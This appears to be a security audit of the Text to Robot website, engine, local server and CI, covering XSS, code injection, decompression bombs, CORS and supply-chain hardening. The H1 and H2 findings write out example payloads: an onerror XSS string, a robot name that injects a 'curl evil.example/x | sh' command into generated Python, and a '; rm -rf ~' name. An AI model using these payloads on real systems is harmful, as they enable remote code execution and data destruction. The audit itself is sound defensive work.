# Security audit

I audited the website (https://megazron.github.io/text-to-robot/), the engine API (`/engine/v1/engine.js`), the local server (`apps/api`), the generated downloads, the build and CI, and the repository settings on 2026-11-10. This file lists what I found, how bad it was, how it could be used, and what fixed it. Robot Studio has its own audit in its repository, and the community board (`community/`) was reviewed while it was being written; its findings are at the end.

Line numbers refer to `main` at 78b8000 (before the fixes).

## Threat model

The site is static and has no accounts, so there is no server-side data to steal. What an attacker can reach:

- **The site's origin.** Script running on `megazron.github.io/text-to-robot` can read every saved robot (localStorage, IndexedDB), rewrite what the page shows, and change any file the visitor downloads. Every other GitHub Pages site of the same owner shares the origin `megazron.github.io`, so script injected here also reaches their storage.
- **The visitor's computer, through downloads.** A ROS 2 package or a training folder is code: people run `colcon build`, `ros2 launch` and `python train_rl.py` on what they download.
- **Inputs an attacker controls:** a share link (`#robot=`, and `#make=` from the launch audit), a robot JSON file someone is sent, gallery posts (GitHub issues anyone can open), community posts, and, for the engine API, everything a page passes to it.
- **The supply chain:** npm packages, the esbuild binary fetched at build time, Python packages in CI, and the GitHub Actions the workflows run.

## Findings

Severity is what an attacker gets, assuming they can send a link or a file.

### High

**H1. Script injection through a share link or a robot file (stored XSS on the site's origin).**
`apps/web/public/app.js:369` and `:388` built the parts list and the engineering record as HTML strings. Text fields went through `esc()`, but numbers did not (`l.qty`, `l.unit_cost`, `j.required_nm`, `j.margin`, `p.check.bbox_mm`, ...), and the whole design record comes from the robot itself: `/api/robots/import` keeps `metadata.design` from the file (`apps/web/src/browser-engine.ts:44`). `esc()` also left `'` alone.
*Exploit:* take any designed robot, set `metadata.design.joints[0].required_nm` to `<img src=x onerror=...>`, pack it into a `#robot=` link and send it. The payload ran as soon as the visitor opened the Parts tab, with full access to the origin.
*Fix:* both views are now built from elements with `h()` (`apps/web/public/safe.js`), which only ever creates text nodes for values; `esc()` and the `link()` HTML helper are gone. A strict CSP with Trusted Types (H3) blocks the whole class even if an HTML string sink comes back.
*Proof:* `scripts/check_xss.py` opens a share link whose design record holds five payloads in eight fields and fails if any element is injected, any dialog opens or the guard global is set; it also checks that the payload text appears as text.

**H2. Code injection into downloaded Python and XML through the robot name.**
`robot_name` was never validated (`packages/robot-schema/src/validate.ts:43` checked link names only). It is written raw into Python docstrings (`packages/training-export/src/export.ts:36`, `:189`), the URDF header comment (`packages/urdf-generator/src/generate.ts:109`), Markdown, the `ros2 launch <name>` command the page copies (`app.js:658`) and download names.
*Exploit:* a shared robot named `x"""\nimport os; os.system("curl evil.example/x | sh")\n"""` produces a `train_rl.py` that runs the attacker's command when the visitor trains; a name with `-->` breaks out of the URDF comment; a name with `; rm -rf ~` rides along in the copied launch command.
*Fix:* `validateSpec` now refuses any robot, link, joint or material name that is not a plain identifier (`[A-Za-z_][A-Za-z0-9_]{0,127}`), so import refuses such a file, and the engine worker refuses any request whose robot has such a name before a generator runs (`browser-engine.ts`, `answer()`).
*Proof:* `tests/security.test.ts` ("names that would break out ...") and the import case of `scripts/check_xss.py`.

### Medium

**M1. No Content-Security-Policy (no defence in depth).** GitHub Pages sends no security headers and the page had no policy, so any injection ran unhindered and any script origin could load.
*Fix:* a strict policy in a `<meta http-equiv>` written by `scripts/csp.ts` (see "Hardening"), plus `<meta name="referrer">`.

**M2. Share-link decompression bomb.** `browser-api.ts:87` inflated the `#robot=` fragment with no limit. About 70 KB of deflate data unpacks to 64 MB; a link at the URL length limit unpacks to gigabytes and kills the tab before anything is checked.
*Fix:* `inflateCapped()` stops at 8 MB and aborts the stream; the fragment itself is capped at 2 MB. The `#make=` gallery links that replay a prompt (added by the launch audit) are capped at 64 KB, parsed with `safeJsonParse()`, and must hold a prompt within the 2,000-character limit and at most 100 changes.
*Proof:* `tests/security.test.ts` (64 MB bomb refused in well under a second) and the bomb case in `scripts/check_xss.py`.

**M3. The local server listened on every interface and allowed every origin.** `apps/api/src/server.ts:173` called `listen(PORT)` (all interfaces) and every answer carried `Access-Control-Allow-Origin: *` (`:51`).
*Exploit:* any web page the developer visits, or anyone on the same network, can drive the generator, fill the data folder and read every stored robot; DNS rebinding works too.
*Fix:* the server binds to 127.0.0.1 unless `HOST` is set (the Docker image sets `HOST=0.0.0.0`), refuses `Host` headers other than localhost when bound to loopback (rebinding), refuses cross-origin POSTs, allows CORS only for origins in `TTR_CORS_ORIGINS`, caps and sanitises JSON bodies and sends `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy` and COOP headers.

**M4. Clickjacking.** The site can be framed by any page; a framed copy under a transparent overlay could be made to download or publish a design. `frame-ancestors` cannot be set from a meta tag.
*Fix:* `app.js` replaces itself with an "Open Text to Robot in its own tab" link when `window.top !== window.self`. If the site ever moves to a host that can send headers, add `Content-Security-Policy: frame-ancestors 'none'` and `X-Frame-Options: DENY` there.
*Proof:* the framed case in `scripts/check_xss.py`.

**M5. Unpinned build tools and Actions (supply chain).** The Pages build ran `npx --yes esbuild@0.25.10`, which downloads esbuild outside the lockfile (no integrity check). All workflows used Actions by mutable tag (`actions/checkout@v4`), the CI token had the repository default permissions, the site workflow gave `pages: write` and `id-token: write` to the build job too, and CI installed `manifold3d` and `scipy` unpinned.
*Fix:* esbuild is a pinned dev dependency (in `package-lock.json` with its integrity hash) and the build uses `npx --no-install`; every Action is pinned to a commit SHA with the tag in a comment; `permissions: contents: read` at the top of every workflow, `pages`/`id-token` only on the deploy job; `persist-credentials: false` on checkout; Python pins `manifold3d==3.5.4` and `scipy==1.17.1` (the versions the last green run used). Dependabot (`.github/dependabot.yml`) keeps npm, pip and the pinned Actions current.

### Low

**L1. Prototype keys in parsed JSON.** Files, share links, saved robots and worker request bodies went through plain `JSON.parse` (`app.js:706`, `browser-api.ts:87`, `browser-engine.ts:130`, `:140`, `server.ts:59`). `JSON.parse` itself only creates an own `__proto__` key, but any later merge that assigns by key could carry it into a prototype.
*Fix:* `safeJsonParse()` drops `__proto__`, `constructor` and `prototype` keys and caps the size; the local server does the same. *Proof:* `tests/security.test.ts`.

**L2. Gallery links could point anywhere.** `app.js:619` linked a gallery card to any `https?://...#robot=` URL in the issue body, so a post could send visitors to a look-alike page.
*Fix:* a card links only to this site (`location.origin + location.pathname + #...`) or to the issue on github.com.

**L3. Archive paths and download names.** `robotkit.js:44` wrote entry names as given and `:59` used the robot name as the download name. Today every entry name comes from the generators, but nothing stopped a `../` entry (zip slip on extraction) or a name with folders.
*Fix:* `safeZipPath()` refuses `..`, drive letters and control characters and strips leading slashes in `makeZip`; `safeFileName()` for downloads. *Proof:* `tests/security.test.ts`.

**L4. Prompt size.** A prompt had no length limit. I found no catastrophic regex backtracking: 2,000 characters of repeated words, numbers, brackets, quotes, dashes and markup, and 20,000 characters of repeated words, each take about as long as a normal prompt (the cost is the design, about 1.5 s; profiling shows the time in the CAD kernel, not in the parser), but a share link that replays a prompt should not be able to make the worker chew on megabytes.
*Fix:* prompts and change requests are capped at 2,000 characters in the page and in the worker. *Proof:* `tests/security.test.ts` ("the prompt parser stays fast ...").

**L5. HTML string sinks for icons.** `ui.js:45` and `:65` used `innerHTML`/`insertAdjacentHTML` with constant icon ids. Not exploitable, but incompatible with Trusted Types; both now build SVG elements.

### Checked and fine

- **Prompts, notes, part and joint names, error messages, gallery titles:** written with `textContent` everywhere (`status()`, `toast()`, the tree, the inspector, the sliders, history, gallery cards).
- **Markdown:** the site renders no Markdown or user HTML anywhere, so a sanitiser such as DOMPurify would add a dependency without protecting anything. If Markdown rendering is ever added, it must go through DOMPurify (Apache-2.0 / MPL-2.0) inside a Trusted Types policy.
- **SVG output (branch `circuits`, not on `main` yet):** `packages/design/src/circuit/draw.ts` escapes every text node, title and `data-*` value; `fill` and `class` values are internal constants. The schematic is shown with `<img>` (scripts never run there), and the "Open full size" `blob:` document inherits this page's CSP, so inline script in it would be blocked too.
- **postMessage:** the page has no `message` listener on `window`; the engine is a dedicated worker, which only its creating page can message.
- **The engine and a hostile embedding page:** a page that imports `engine.js` runs the worker in its own origin (the blob bootstrap is created by that page), so it can only use the engine on its own visitors' devices; it cannot reach this site's storage. The bootstrap embeds the script URL with `JSON.stringify`, so a `base` option cannot inject code.
- **eval in the worker:** no code of mine evaluates strings. The bundled Emscripten glue of manifold-3d and OpenCascade builds call wrappers with `new Function` from C++ type signatures at start-up (never from input); that is why an embedding page's CSP needs `'unsafe-eval'` (measured in Chromium: without it the engine fails with "script-src blocked eval") (see docs/ENGINE_API.md).
- **Third-party code at runtime:** none. three.js is copied from `node_modules` into `vendor/` by `scripts/vendor_web.ts`, fonts are local, the only network call the page makes is the opt-in gallery list from `api.github.com`, and every link is HTTPS. No CDN means no Subresource Integrity is needed.
- **Dependencies:** `npm audit` reports 0 vulnerabilities (2026-11-10); three 0.160.0 has no open advisory; esbuild 0.25.10 includes the fix for the dev-server advisory GHSA-67mh-4wv8-2f99 (and the site only uses it to bundle). Python: `playwright==1.63.0` pinned; `python/pyproject.toml` uses bounded ranges.
- **CI:** no `pull_request_target`, no secrets used or echoed, no workflow writes to the repository.
- **Secrets:** gitleaks 8.28.0 over all 256 commits of every branch: 314 hits, all the `generic-api-key` rule matching catalog part keys such as `"key": "blower_5015_12v"`; none is a credential. No GitHub, AWS, Slack or private-key pattern appears in any added line of history.

## Hardening

**Content-Security-Policy** (meta tag, written by `node scripts/csp.ts --write`, rechecked by `tests/security.test.ts`; `deploy/build-pages.sh` rewrites it for the built page because the import map changes there):

| Directive | Value | Why |
|---|---|---|
| `default-src` | `'none'` | nothing loads unless listed |
| `script-src` | `'self'` + sha256 of the import map | the only inline script is the import map; no `unsafe-inline`, no `unsafe-eval` |
| `style-src` | `'self'` | no inline `style=""` attributes remain (styles set through `element.style` are allowed) |
| `img-src` | `'self' data: blob:` (+ community API) | icons, schematic previews, post thumbnails |
| `connect-src` | `'self' https://api.github.com` (+ community API, Turnstile) | the gallery list; `/api/*` is answered in the tab |
| (engine worker) | no policy of its own (GitHub Pages sends no headers) | it reaches out only when the visitor switches a reading option on: Hugging Face and jsDelivr for the sentence model, the chosen model provider with the visitor's key; `scripts/check_reading.py` proves nothing leaves the site with both off |
| `worker-src` | `'self'` | the engine and forge workers are same-origin files; no `blob:` needed on the site |
| `frame-src` | `'none'` (Turnstile when the board is on) | |
| `object-src`, `base-uri`, `form-action` | `'none'` | |
| `require-trusted-types-for` | `'script'` | strings never reach `innerHTML`, `script.src` or `new Worker()` |
| `trusted-types` | `ttr 'allow-duplicates'` | the one policy (`safe.js`, `scriptUrl()`), which only allows this site's files and the Turnstile script |
| `upgrade-insecure-requests` | | no mixed content even by mistake |

The community board's origins come from `apps/web/public/community.json` (`api`, `turnstileSiteKey`); with both empty the board's origins are not in the policy at all.

`frame-ancestors` cannot be delivered by a meta tag; see M4.

**Input limits** (`apps/web/public/safe.js`): robot JSON 8 MB (file or unpacked link), share-link fragment 2 MB, prompt 2,000 characters, prototype keys dropped, names must be identifiers, zip paths confined, download names sanitised, link targets http(s) only.

## Tests

- `tests/security.test.ts` (in `npm test`): hostile names, prototype keys, a 64 MB deflate bomb, zip slip paths, hostile prompts, the CSP being current and strict, and no HTML sinks, inline handlers, inline styles, `eval` or `javascript:` URLs in the web app.
- `scripts/check_xss.py` (CI site job): the real page in Chromium against payload share links, a payload robot file, a prototype-pollution file, a deflate bomb and framing, failing on any CSP or Trusted Types violation.
- `scripts/check_site.py` and `scripts/check_engine.py` report every CSP violation as a page error; `check_engine.py` loads the engine into a page on another origin that sends the strict embedder policy from docs/ENGINE_API.md.

## Repository settings

Enabled with `gh` on 2026-11-10: Dependabot alerts and security updates, secret scanning with push protection, private vulnerability reporting (the contact in `SECURITY.md`), CodeQL code scanning (`.github/workflows/codeql.yml`, JavaScript and TypeScript, `security-extended` queries), and branch protection on `main` that requires the CI checks but no reviews and does not apply to administrators, so I can still push directly.

## CodeQL triage

The first CodeQL run on `main` (2026-11-10, `security-extended`) opened 30 alerts. None is a new exploitable finding; I am leaving them open in the Security tab until each is either fixed in code or dismissed there with its reason:

- **`js/remote-property-injection` (11, `apps/web/src/engine/edit.ts`, `api.ts`, `browser-engine.ts`, `urdf-validator/src/xml.ts`):** objects keyed by link, joint or attribute names. Names must now be identifiers and may not be `__proto__`, `constructor` or `prototype` (`validateSpec`), and request bodies drop those keys, so no key can reach a prototype. The lasting fix is `Map` or `Object.create(null)` for these tables.
- **`js/polynomial-redos` (10, `packages/robot-generator/src/text.ts`, two in tests):** quadratic at worst, on prompts capped at 2,000 characters; measured under L4.
- **`js/missing-origin-check` (2, the engine and forge workers' `onmessage`):** dedicated workers only hear the page that created them; there is no origin to check.
- **`js/regex/missing-regexp-anchor` (3), `js/insecure-temporary-file` (2), `js/file-system-race` (1):** tests and developer scripts that run on my machine or in CI, not in the site.

## Community board review

Reviewed `community/` (Cloudflare Worker, D1, KV) while it was being written. Already right: every query parameterised, the admin token compared in constant time and never sent to the client, Turnstile verified on the server, a daily-salted visitor hash instead of any stored address, images checked by magic bytes and served with `nosniff` and `default-src 'none'`, posts shown with `textContent` on the admin page, delete tokens stored as SHA-256. Fixed on review: IPv6 visitors hashed by /64 so one connection cannot rotate identities to mass-report or flood; restored posts no longer re-hidden by reports; a global daily post cap and cached public reads; hashed inline script and style in the admin page CSP with Trusted Types; delete tokens only in a header, never a URL; Turnstile action and hostname checked; request bodies read with a byte cap; `default-src 'none'; frame-ancestors 'none'` and `Referrer-Policy: no-referrer` on every answer.

## Reporting

See [SECURITY.md](../SECURITY.md).
